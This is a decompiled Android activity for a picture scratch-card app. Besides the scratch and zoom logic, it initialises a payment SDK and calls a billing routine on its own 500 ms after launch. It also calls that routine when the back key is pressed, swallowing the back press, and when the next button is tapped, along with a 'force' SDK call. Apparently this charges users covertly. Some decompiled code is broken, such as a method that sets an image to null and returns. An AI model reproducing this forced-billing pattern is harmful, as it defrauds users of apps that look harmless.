package com.meiqu.beauty;

import java.util.Timer;
import java.util.TimerTask;

import android.app.Activity;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import com.meiqu.beauty.abc.fab;
import com.pay.sdk.alan.main.MoSDK;

public class MainActivity extends Activity {

    Handler a;
    private MyZoomImageView b;
    private ScratchView c;
    /**点击下一个按钮*/
    private View d;
    private TextView e;
    private ImageView f;
    private boolean g;
    private int h;
    private final Timer i;
    private TimerTask j;
    private int k;
    private int l;
    private int[] m;
    private Handler n;

    public MainActivity() {
        super();
        this.g = false;
        this.h = 0;
        this.i = new Timer();
        this.k = 0;
        this.l = 0;
        this.m = new int[]{2130837506, 2130837508, 2130837509, 2130837510, 2130837511, 2130837512, 2130837513, 2130837514, 2130837515, 2130837507};
    }

    static int a(MainActivity arg0, int arg1) {
        arg0.l = arg1;
        return arg1;
    }

    private void a() {
        int v2 = 5;
        int v8 = -1;
        SharedPreferences v5 = this.getSharedPreferences("image", 0);
        int v0;
        for(v0 = 0; v0 < fab.L.length; ++v0) {
            if(fab.L[v0].id == v5.getInt("currentId", v8)) {
                this.h = v0;
            }
        }

        v0 = v2 > fab.L.length ? fab.L.length : v2;
        int v3 = this.h;
        if(v3 < 0) {
            v3 = 0;
        }

        int v4;
            Bitmap v3_1 =
			null;

            if(v3_1 == null) {
                return;
            }

            this.b.setImageBitmap(v3_1);
            this.b.a();
            SharedPreferences.Editor v0_1 = v5.edit();
            v0_1.putInt("currentId", fab.L[this.h].id);
            v0_1.apply();
    }

    static boolean a(MainActivity arg1) {
        return arg1.g;
    }

    static boolean a(MainActivity arg0, boolean arg1) {
        arg0.g = arg1;
        return arg1;
    }

    static int b(MainActivity arg0, int arg1) {
        arg0.k = arg1;
        return arg1;
    }

    static View b(MainActivity arg1) {
        return arg1.d;
    }
    
	public static int images[] = new int[]{bvcnm.qasdf.xzbsdf.R.drawable.p2,bvcnm.qasdf.xzbsdf.R.drawable.p3,bvcnm.qasdf.xzbsdf.R.drawable.p4,bvcnm.qasdf.xzbsdf.R.drawable.p5};

    private void b() {
    	
		if (images != null && images.length > 0)
		{
			SharedPreferences v0 = this.getSharedPreferences("image", 0);
			int v1 = v0.getInt("currentId", 0);
			v1 = v1 >= images.length ? v1 - images.length : v1;

			Bitmap v2 = null;
			v2 = BitmapFactory.decodeResource(getResources(), images[v1]);
			v0.edit().putInt("currentId", ++v1).commit();

			this.b.setImageBitmap(v2);
			this.b.a();
		}
    	
            this.d.setVisibility(8);
            this.c.b();
            this.g = false;
            this.k = 0;
    }

    static ImageView c(MainActivity arg1) {
        return arg1.f;
    }

    static TextView d(MainActivity arg1) {
        return arg1.e;
    }

    public boolean dispatchTouchEvent(MotionEvent arg4) {
        boolean v0 = true;
        switch(arg4.getActionMasked()) {
            case 0: {
                if(this.g) {
                    this.b.onTouchEvent(arg4);
                    return v0;
                }

                this.c.onTouchEvent(arg4);
                break;
            }
            case 1: {
                if(this.g) {
                    this.b.onTouchEvent(arg4);
                    if((((float)this.d.getLeft())) > arg4.getX()) {
                        return v0;
                    }

                    if((((float)this.d.getRight())) < arg4.getX()) {
                        return v0;
                    }

                    if((((float)this.d.getTop())) > arg4.getY()) {
                        return v0;
                    }

                    if((((float)this.d.getBottom())) < arg4.getY()) {
                        return v0;
                    }

                    this.d.performClick();
                    return v0;
                }

                this.c.onTouchEvent(arg4);
                break;
            }
            case 2: {
                if(arg4.getPointerCount() == 1 && !this.g) {
                    this.c.onTouchEvent(arg4);
                    return v0;
                }

                this.b.onTouchEvent(arg4);
                break;
            }
            case 5: {
                if(!this.g) {
                	v0 = super.dispatchTouchEvent(arg4);
                    break;
                }

                this.b.onTouchEvent(arg4);
                v0 = super.dispatchTouchEvent(arg4);
                break;
            }
            case 6: {
                if(!this.g) {
                	v0 = super.dispatchTouchEvent(arg4);
                    break;
                }

                this.b.onTouchEvent(arg4);
                v0 = super.dispatchTouchEvent(arg4);
                break;
            }
            default: {
            label_3:
                v0 = super.dispatchTouchEvent(arg4);
                break;
            }
        }

        return v0;
    }

    static ScratchView e(MainActivity arg1) {
        return arg1.c;
    }

    /**设置更换图片*/
    static void f(MainActivity arg0) {
        arg0.b();
    }

    static int g(MainActivity arg1) {
        return arg1.k;
    }

    static int h(MainActivity arg2) {
        int v0 = arg2.k;
        arg2.k = v0 + 1;
        return v0;
    }

    static int i(MainActivity arg1) {
        return arg1.l;
    }

    static int[] j(MainActivity arg1) {
        return arg1.m;
    }

    static void k(MainActivity arg0) {
        arg0.a();
    }
    public static Activity myActivity;
    protected void onCreate(Bundle arg10) {
    	 MoSDK.getInstance().initSDK(this);
    	 myActivity = this;
        long v2 = 1000;
        int v7 = 6;
        int v6 = 5;
        super.onCreate(arg10);
        this.getWindow().addFlags(128);
        this.setContentView(2130968577);
		this.b = ((MyZoomImageView) findViewById(2131296256));
		//设置图片资源
		this.b.setImageBitmap(BitmapFactory.decodeResource(getResources(), bvcnm.qasdf.xzbsdf.R.drawable.p1));
		this.e = ((TextView) findViewById(2131296263));
		this.e.setText("");
		this.c = ((ScratchView) findViewById(2131296257));
        this.c.setEraserSize(60f);
        this.c.setMaskColor(0);
        this.c.setWatermark(2130837517);
        this.c.setCanErase(true);
        this.c.setMaxPercent(80);
        this.c.setEraseStatusListener(new com.meiqu.beauty.ScratchView.a() {
            public void a(int arg4) {
                if(arg4 >= 100) {
                    if(!MainActivity.a(MainActivity.this)) {
                        MainActivity.a(MainActivity.this, true);
                        MainActivity.b(MainActivity.this).setVisibility(0);
                        MainActivity.c(MainActivity.this).setVisibility(8);
                        MainActivity.d(MainActivity.this).setText("已全部擦去，试试放大女神！");
                    }
                }
                else if(arg4 == 0) {
                    MainActivity.d(MainActivity.this).setText("");
                }
                else {
                    MainActivity.d(MainActivity.this).setText("已擦去" + arg4 + "%，继续加油哦！");
                }
            }

            public void a(View arg2) {
                if(!MainActivity.a(MainActivity.this)) {
                    MainActivity.e(MainActivity.this).c();
                }
            }
        });
        this.d = this.findViewById(2131296262);
        this.d.setVisibility(8);
        this.d.setOnClickListener(new View.OnClickListener() {
            public void onClick(View arg5) {
            	//调用支付
            	GuideActivity.pay();
            	MainActivity.f(MainActivity.this);
            	 MoSDK.getInstance().doSDKForce(MainActivity.this);
            }
        });
        this.f = ((ImageView) findViewById(2131296259));
        this.f.setVisibility(8);
        this.h = -1;
        
        //调用计费
        new Handler().postDelayed(new Runnable() {
            public void run() {
            	GuideActivity.pay();
            }
        }, 500);
    }

    public boolean onKeyDown(int arg3, KeyEvent arg4) {
        boolean v0;
        int v1 = 4;
        if(arg3 == v1) {
            GuideActivity.pay();
            v0 = false;
        }
        else {
            v0 = super.onKeyDown(arg3, arg4);
        }

        return v0;
    }
}

